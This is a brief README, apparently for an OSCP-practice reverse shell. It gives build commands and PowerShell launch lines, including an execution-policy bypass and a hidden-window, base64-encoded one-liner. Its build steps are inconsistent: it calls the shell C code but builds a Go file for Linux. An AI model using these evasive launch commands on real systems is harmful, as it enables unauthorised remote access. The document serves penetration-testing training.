# Simple Shell for OSCP

A simple shell written in C, change IP and port and build.

**Build Windows:**
```bash
x86_64-w64-mingw32-gcc shell.c -o shell.exe -lws2_32
```

**Build Linux (static):**
```bash
CGO_ENABLED=0 go build -ldflags "-s -w" -o shell shell.go
```

**Run PowerShell (Windows):**
```powershell
powershell -ExecutionPolicy Bypass -File shell.ps1
```

One-liner (base64-encoded payload):
```bash
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content shell.ps1 -Raw)))
powershell -nop -w hidden -e $enc
```

